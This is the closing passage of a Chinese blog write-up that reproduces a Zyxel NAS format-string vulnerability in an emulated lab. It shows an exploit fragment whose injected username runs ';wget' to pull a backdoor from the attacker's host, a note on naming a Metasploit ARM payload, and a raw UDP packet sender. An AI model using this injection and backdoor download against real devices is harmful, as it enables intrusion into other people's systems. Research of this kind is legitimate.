+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669797869709-fc6a0dc5-984d-416b-8422-c25d64762094.png" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;arm&quot;</span></span><br><span class="line">context.endian=<span class="string">&quot;little&quot;</span></span><br><span class="line"><span class="comment"># （和exp4.py一样）...</span></span><br><span class="line">payload2_username = <span class="string">b&quot;;wget http://192.168.5.2:8080/back -O /back;&quot;</span></span><br><span class="line"><span class="comment"># 略...</span></span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669799439243-4f1e09ff-cc98-40fd-a579-49b0ce20e034.png" alt="image.png"></p>
+<blockquote>
+<p>注意：关于backdoor文件的命名注意简短，否则可能会出现wget文件之后落地文件的命名不正确，比如<code>msf-arm-positive</code>落地后文件名称变为了<code>b,</code>：</p>
+<ul>
+<li><code>payload2_username = b&quot;;wget http://192.168.5.2:8080/msf-arm-positive -O /back;&quot;</code><br><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669799599787-0a9ef07a-a512-4f21-b3a7-a383aa37506f.png" alt="image.png"></li>
+</ul>
+</blockquote>
+<h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>在实际利用的过程中我遇到了以下难题：</p>
+<ol>
+<li>复现前我已经将格式化字符串漏洞的所有知识忘得一干二净，偏移都忘了怎么找了…</li>
+<li>不知道（忘了）可以修改got表为plt。</li>
+<li><code>std::string::string</code> 会发生\x00截断。</li>
+<li>“\n”的添加导致格式化时目标地址错误，让我不得不寻找额外的思路去解决。</li>
+</ol>
+<p>如果不想安裝pwntools的话也可以使用python自带的库实现：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>():</span><br><span class="line">    l=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    l.bind((<span class="string">&#x27;&#x27;</span>, <span class="number">50127</span>))  <span class="comment"># 监听本地（Ubuntu）的50127端口</span></span><br><span class="line">    <span class="built_in">print</span>(l.recvfrom(<span class="number">100</span>))  <span class="comment"># 接收100字节应该够了</span></span><br><span class="line">    l.close()</span><br><span class="line"></span><br><span class="line">thread=Thread(target=accept)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.5.1&quot;</span>, <span class="number">50127</span>))</span><br><span class="line">data=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;00420241001c42af5b3a004f525400123456555345524e414d453a6379626572616e67656c0950415353574f52443a6379626572616e67656c0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">s.send(data)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-07/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img class="cover" src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</div></div><div class="info-2"><div class="info-item-1">《IoT从入门到入土》(11)–IoT靶场环境docker封装指南  前置基础：需掌握docker、dockerfile、docker-compose的最基本使用方法   在本篇文章中，我将对IoT模拟环境的docker封装分为两种方式 – 以firmAE、firmadyne、firmware-analysis-plus为代表的一键模拟的封装；以hook、patch（qemu-system）为代表的手动模拟环境的封装。并在文章最后列出了一些注意事项。   firmAE ： https://github.com/pr0v3rbs/FirmAE firmadyne ： https://github.com/firmadyne/firmadyne firmware-analysis-plus ： https://github.com/liyansong2018/firmware-analysis-plus   一、一键模拟的封装这里就以D-Link的DIR-818L为例说明，使用firmAE模拟（该工具模拟时间较长，请耐心等待）：  启动后来到【FirmAE安装目录】/scratch/...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img class="cover" src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</div></div><div class="info-2"><div class="info-item-1">《IoT从入门到入土》(10-1)–Zyxel-NAS格式化字符串漏洞复现环境搭建  Ubuntu虚拟机网络链接方式为“桥接”。 本文首发于IOTsec-Zone   1、前言之前在IoTsec-Zone社区的安全情报中看到了一个NAS的CVE（CVE-2022-34747），其漏洞类型是一直没有遇到过的格式化字符串漏洞，本篇文章我们先搭建一下环境。  2、基本分析访问Zyxel的Security-Advisories知道影响范围包含了型号NAS326、NAS540、NAS542：   https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-format-string-vulnerability-in-nas    该漏洞已经在该型号的最新版本固件V5.21(AAZF.12)C0中修复，查看最新版本的Release Note有如下这么两句轻描淡写的话：  对于NAS326来说，受影响的版本为V5.21(AAZF.11)C0以及之前，所以下载相应的包含漏洞的固件就...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B-10-2-%E2%80%93Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32%E2%80%93Hijack-GOT%E3%80%81UDP%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">《IoT从入门到入土》(10-2)–Zyxel-NAS漏洞复现（ARM32–Hijack GOT、UDP）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%90%AF%E5%8A%A8%E6%A8%A1%E6%8B%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">1、启动模拟环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%BC%80%E5%A7%8Bpwn"><span class="toc-number">1.2.</span> <span class="toc-text">2、开始pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E3%80%81%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">①、收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E3%80%81%E5%AF%BB%E6%89%BE%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.2.</span> <span class="toc-text">②、寻找调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E3%80%81%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">③、思路整理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A3%E3%80%81%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.4.</span> <span class="toc-text">④、构造利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">3、总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
